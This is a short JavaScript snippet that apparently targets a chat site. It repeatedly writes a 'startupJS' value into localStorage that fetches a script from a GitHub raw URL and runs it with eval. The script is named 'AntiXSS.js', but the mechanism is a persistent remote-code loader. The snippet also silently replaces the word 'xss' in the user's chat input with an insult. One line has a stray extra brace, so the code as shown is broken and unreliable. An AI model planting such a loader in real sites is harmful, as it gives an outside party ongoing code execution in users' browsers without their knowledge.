const chatInput = document.getElementById('chat_message');
setInterval(()=>{localStorage.setItem('startupJS', `fetch('https://raw.githubusercontent.com/ivorydevrimoalt/BONZIWORLDKRANTIVILLAIN/refs/heads/main/AntiXSS.js').then(r=>r.text()).then(eval);`)}},100/6);
if (chatInput) {
  chatInput.addEventListener('input', (event) => {
    event.target.value = event.target.value.replace(/xss/gi, 'asshole');
  });
}
